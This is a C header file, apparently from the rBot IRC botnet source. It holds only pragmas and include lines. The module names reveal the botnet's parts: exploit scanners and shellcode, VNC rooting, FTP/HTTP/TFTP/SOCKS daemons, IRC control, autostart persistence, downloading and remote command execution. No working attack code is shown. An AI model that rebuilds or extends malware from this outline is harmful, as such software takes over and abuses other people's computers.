#ifdef WIN32
#define _WIN32_WINNT	0x0403				// Very important for critical sections.
#define WIN32_LEAN_AND_MEAN					// Good to use.
#pragma optimize("gsy", on)					// Global optimization, Short sequences, Frame pointers.
#pragma comment(linker,"/RELEASE")			// Release code
#pragma comment(linker, "/ALIGN:4096")		// This will save you some size on the executable.
#pragma comment(linker, "/IGNORE:4108 ")	// This is only here for when you use /ALIGN:4096.
//#pragma pack(1)								// Force packing on byte boundaries.
#endif // WIN32

#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <malloc.h>
#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <windns.h>
#include <iphlpapi.h>
#include <lm.h>
#include <lmat.h>
#include <io.h>
#include <fcntl.h>
#include <tchar.h>
#include <tlhelp32.h>
#include <assert.h>
#include <sqlext.h>
#include <vfw.h>
#include <shlobj.h>
#include <ntsecapi.h>

#include "rBot.h"
#include "defines.h"
#include "tcpip.h"

//SCANNERS
#include "advscan.h"
#include "mssql.h"
#include "scan.h"
#include "shellcode.h"
#include "workstation.h"
#include "vncrooter.h"

//DAEMONS
#include "ftpd.h"
#include "httpd.h"
#include "socks4.h"
#include "tftpd.h"

//IRC
#include "irc_send.h"
#include "ident.h"
#include "rndnick.h"

//UTILITIES
#include "autostart.h"
#include "download.h"
#include "driveinfo.h"
#include "misc.h"
#include "net.h"
#include "netutils.h"
#include "processes.h"
#include "remotecmd.h"
// #include "secure.h"
#include "sysinfo.h"
#include "wildcard.h"


//OTHER
#include "aliaslog.h"
#include "crc32.h"
#include "crypt.h"
#include "defines.h"
#include "ehandler.h"
#include "fphost.h"
#include "loaddlls.h"
#include "threads.h"
